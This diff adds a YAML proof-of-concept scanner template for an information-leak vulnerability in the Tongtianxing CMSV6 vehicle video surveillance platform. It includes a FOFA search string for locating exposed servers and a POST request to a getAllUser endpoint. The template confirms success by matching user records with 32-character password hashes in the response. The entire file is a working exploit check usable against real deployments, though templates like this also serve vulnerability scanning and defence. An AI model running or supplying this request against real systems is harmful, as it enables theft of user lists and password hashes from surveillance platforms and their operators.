@@ -1,0 +1,18 @@
+id: poc-yaml-tongtianxing-cmsv6-information-leak
+info:
+  name: 通天星CMSV6车载视频监控平台 信息泄露漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: cmsv6
+  fofa: body="/808gps/"
+requests:
+- method: POST
+  path: /808gps/StandardLoginAction_getAllUser.action
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  expression: "status_code == 200 && \nmatches(body,\"password\\\":\\\"\\\\w{32}\"\
+    ) &&\ncontains(body,\"departmentEx\") &&\ncontains(headers,\"application/json\"\
+    ) &&\ncontains(body,\"result\\\":0\")\n"
+variables: {}
+transport: http
